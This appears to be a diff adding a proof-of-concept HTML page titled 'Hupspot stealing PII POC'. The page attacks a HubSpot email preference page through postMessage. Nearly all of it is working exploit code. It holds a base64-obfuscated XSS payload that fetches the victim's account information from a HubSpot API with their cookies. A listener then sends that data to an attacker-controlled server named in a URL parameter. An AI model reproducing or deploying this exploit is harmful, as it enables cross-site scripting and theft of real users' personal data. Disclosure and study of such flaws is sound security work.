@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Hupspot stealing PII POC</title>
+  </head>
+  <body>
+    <script>
+      let win = window.open(
+        "https://hs-6069836.s.hubspotemail.net/hs/manage-preferences/unsubscribe-all"
+      );
+      setTimeout(() => {
+        poc(win);
+      }, 5000);
+
+      function poc(win) {
+        let fetchPII = `<img src=x onerror="eval(atob('dmFyIFBJSTsKLy8gZmV0Y2hpbmcgdmljdGltIHVzZXIgUElJIGluZm8gCmZldGNoKCdodHRwczovL2FwcC1ldTEuaHVic3BvdC5jb20vYXBpL2xvZ2luLXZlcmlmeS91c2VyLWluZm8nLHttZXRob2Q6J2dldCcsY3JlZGVudGlhbHM6ICdpbmNsdWRlJywgIGhlYWRlcnM6eydDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJ319KQogIC50aGVuKChyZXNwb25zZSkgPT4gcmVzcG9uc2UuanNvbigpKQogIC50aGVuKCh4KSA9PiB7CiAgICBQSUkgPSBKU09OLnN0cmluZ2lmeSh4KTsKICAgIHdpbmRvdy5vcGVuZXIucG9zdE1lc3NhZ2UoUElJLCAiKiIpOyAvLyBzZW5kIHZpY3RpbSB1c2VyIFBJSSBpbmZvIHRvIHBhcmVudCB3aW5kb3cgCiAgICBhbGVydChkb2N1bWVudC5kb21haW4pOyAKICAgIH0pOwogICAg'))" >`;
+
+        msg = {
+          type: "hsFormCallback",
+          id: fetchPII,
+        };
+        win.postMessage(msg, "*");
+      }
+
+      window.addEventListener("message", function (msg) {
+        // when recive user PII info send it to attacker server
+
+        let ATTACKER_SERVER = new URLSearchParams(location.search).get("url");
+
+        new Image().src =
+          ATTACKER_SERVER +
+          "?victimPII=" + // add here your controlable server to send victim PII info to it
+          msg.data;
+      });
+    </script>
+  </body>
+</html>
